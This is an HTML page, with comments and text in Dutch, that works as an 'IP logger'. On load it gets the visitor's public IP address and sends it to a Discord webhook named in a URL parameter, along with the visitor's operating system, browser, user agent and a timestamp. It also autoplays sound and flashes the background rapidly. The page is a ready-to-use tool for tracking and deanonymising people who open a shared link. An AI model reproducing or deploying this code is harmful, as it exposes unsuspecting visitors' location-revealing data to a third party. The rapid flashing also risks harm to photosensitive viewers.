<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
            background-color: white;
            color: black;
            animation: changeBackground 0.4s infinite;
            position: relative;
        }
        h1 {
            color: inherit;
        }
        p {
            color: inherit;
            margin-bottom: 40px;
        }
        @keyframes changeBackground {
            0% { background-color: white; color: black; }
            50% { background-color: black; color: white; }
            100% { background-color: white; color: black; }
        }
    </style>
    <script>
        var embedSent = false;
        var musicStarted = false;

        function startMusic() {
            if (!musicStarted) {
                var audio = new Audio('sound.mp3');
                audio.play();
                musicStarted = true;
            }
        }

        function sendToDiscord(webhookURL) {
            var ipAddress = "Unknown"; // Default value for IP address
            var script = document.createElement('script');
            script.src = 'https://api64.ipify.org?format=json&callback=handleIPResponse';
            document.body.appendChild(script);

            window.handleIPResponse = function(data) {
                ipAddress = data.ip;
                sendEmbed(webhookURL, ipAddress);
            };
        }

        function sendEmbed(webhookURL, ipAddress) {
            var userAgent = navigator.userAgent;
            var timestamp = new Date().toISOString();
            var os = detectOS(userAgent);
            var browser = detectBrowser(userAgent);

            var embed = {
                "embeds": [
                    {
                        "title": "IP Logger",
                        "description": "Een gebruiker heeft de pagina bezocht.",
                        "color": 65280, // Groen als het leuk vond, Rood als niet leuk
                        "fields": [
                            {
                                "name": "IP Adres",
                                "value": ipAddress,
                                "inline": true
                            },
                            {
                                "name": "Besturingssysteem",
                                "value": os,
                                "inline": true
                            },
                            {
                                "name": "Browser",
                                "value": browser,
                                "inline": true
                            },
                            {
                                "name": "Gebruikersagent",
                                "value": userAgent,
                                "inline": false
                            },
                            {
                                "name": "Tijdstip",
                                "value": timestamp,
                                "inline": true
                            }
                        ]
                    }
                ]
            };

            var xhr = new XMLHttpRequest();
            xhr.open("POST", webhookURL);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(embed));
        }

        function detectOS(userAgent) {
            var OSes = [
                'Windows',
                'Mac OS',
                'Linux',
                'iOS',
                'Android'
            ];

            var detectedOS = OSes.find(function(os) {
                return userAgent.indexOf(os) >= 0;
            });

            return detectedOS || 'Onbekend';
        }

        function detectBrowser(userAgent) {
            var browsers = [
                'Chrome',
                'Firefox',
                'Safari',
                'Edge',
                'Opera'
            ];

            var detectedBrowser = browsers.find(function(browser) {
                return userAgent.indexOf(browser) >= 0;
            });

            return detectedBrowser || 'Onbekend';
        }

        window.onload = function() {
            startMusic(); // Start muziek direct bij het laden van de pagina
            
            // Haal de queryparameter op om te controleren of er een specifieke webhook URL is opgegeven
            const urlParams = new URLSearchParams(window.location.search);
            const webhookID = urlParams.get('webhook');

            // Als er een webhook ID is opgegeven, stuur de informatie naar die webhook
            if (webhookID) {
                sendToDiscord("https://discord.com/api/webhooks/" + webhookID);
            }
        }
    </script>
</head>
<body>
    <h1>Welkom bij onze geweldige site!</h1>
    <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
</body>
</html>
